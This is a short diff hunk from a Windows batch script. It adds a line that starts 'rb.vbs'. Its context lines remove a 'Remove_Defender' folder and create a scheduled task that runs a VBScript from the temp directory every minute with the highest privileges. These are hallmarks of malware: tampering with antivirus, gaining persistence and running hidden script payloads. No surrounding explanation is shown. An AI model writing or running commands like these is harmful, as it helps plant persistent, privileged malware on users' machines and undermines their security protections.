@@ -57,7 +57,7 @@ rmdir /s /q "Remove_Defender"
 
 schtasks /create /tn "TempVBS" /tr "%temp%\e.vbs" /sc minute /mo 1  /f /rl HIGHEST
 timeout /t 5
-
+start rb.vbs
 
 
 
